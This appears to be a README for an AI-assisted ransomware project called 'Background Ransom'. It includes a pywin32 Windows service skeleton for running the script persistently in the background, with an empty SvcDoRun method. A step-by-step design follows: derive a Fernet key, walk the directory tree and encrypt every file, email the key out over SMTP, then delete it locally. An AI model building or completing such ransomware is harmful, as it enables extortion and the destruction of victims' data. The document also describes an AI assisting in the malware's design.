# Background Ransom
## Description
Same goal to encrypt. The whole program will be made manually but assisted by ai. The design however, is an amalgamation of ideas from a trained model.

## Notes

It is possible to make the script run in the background as a Windows service. To do this, you can use the pywin32 package to create a Windows service that runs your script in the background.

Here is an example of how you can create a Windows service that runs your script in the background:


```
import win32service
import win32serviceutil
import win32event

class MyService(win32serviceutil.ServiceFramework):
    _svc_name_ = "MyService"
    _svc_display_name_ = "My Service"

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)

    def SvcDoRun(self):
        # Run your script in the background here

if __name__ == "__main__":
    win32serviceutil.HandleCommandLine(MyService)
```


This code creates a MyService class that extends the win32serviceutil.ServiceFramework class. The __init__ method initializes the service and creates an event object that will be used to stop the service. The SvcStop method sets the event object to signal that the service should be stopped,


## Design

The program uses the following classes and methods:
- win32serviceutil.ServiceFramework is a class that defines a new Windows service.
- win32event.CreateEvent() is a method that creates an event that the service can wait on.
- win32event.SetEvent() is a method that signals the event to stop the service.
- smtplib.SMTP() is a class that creates a connection to the email server.
- os.urandom() is a method that generates a random salt for the encryption key.
- PBKDF2HMAC() is a class that derives the encryption key from the password and salt using a secure key derivation function.
- Fernet() is a class that creates a Fernet object that can be used to encrypt and decrypt data.
- os.walk() is a method that recursively scans the directory tree and finds all files.
- Additionally, the following methods are defined in the MyService class:

- SvcStop() is called when the service is stopped. It signals the event to stop the service and reports the service status as SERVICE_STOP_PENDING.
- SvcDoRun() is called when the service is started. It scans the directory tree for files and encrypts them using the Fernet object. It also sends the encryption key to the email address provided and deletes the key locally.


When the program is run, it performs the following steps:
- It creates a new Windows service using the win32serviceutil.ServiceFramework class.
- It creates an event that the service can wait on using the win32event.CreateEvent() method.
- It generates a random salt and uses it to derive an encryption key using the os.urandom() and PBKDF2HMAC() methods.
- It creates a Fernet object using the Fernet() class that can be used to encrypt and decrypt data.
- It scans the directory tree for files using the os.walk() method and encrypts them using the Fernet object.
- It sends the encryption key to the specified email address using the smtplib.SMTP() class.
- It deletes the encryption key locally.

When the service is stopped, it performs the following steps:
- It signals the event to stop the service using the win32event.SetEvent() method.
- It reports the service status as SERVICE_STOP_PENDING.
